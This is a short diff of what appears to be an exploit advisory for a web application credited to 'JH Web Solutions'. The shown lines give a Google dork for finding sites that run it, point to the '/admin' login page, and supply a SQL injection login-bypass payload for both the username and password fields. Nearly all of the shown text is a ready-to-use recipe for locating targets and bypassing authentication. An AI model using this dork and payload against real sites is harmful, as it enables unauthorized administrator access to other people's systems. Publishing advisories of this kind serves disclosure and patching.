@@ -10,6 +10,8 @@
 Proof of Concept:
 Search google Dork: intext:"Developed By : JH Web Solutions"
 
+access admin login at: site.com/admin
+
 Login With This Detail:
 user: ' or 1=1 limit 1 -- -+ 
 password: ' or 1=1 limit 1 -- -+
